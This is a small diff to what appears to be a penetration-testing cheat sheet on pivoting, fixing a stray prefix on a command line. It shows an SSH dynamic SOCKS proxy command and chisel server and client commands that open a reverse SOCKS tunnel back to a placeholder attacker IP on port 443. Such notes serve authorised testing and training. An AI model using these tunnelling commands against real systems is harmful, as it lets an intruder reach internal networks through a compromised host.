@@ -50,7 +50,7 @@ sudo ssh -N -D 127.0.0.1:9000 <username>@<IP>
 - https://github.com/jpillora/chisel
 ```
 /opt/chisel/chisel server -p 443 --socks5 --reverse
-shellcmd ./chisel.exe client <ATTACKER IP>:443 R:socks
+./chisel.exe client <ATTACKER IP>:443 R:socks
 ```
 
 #### Port forwarding plink.exe
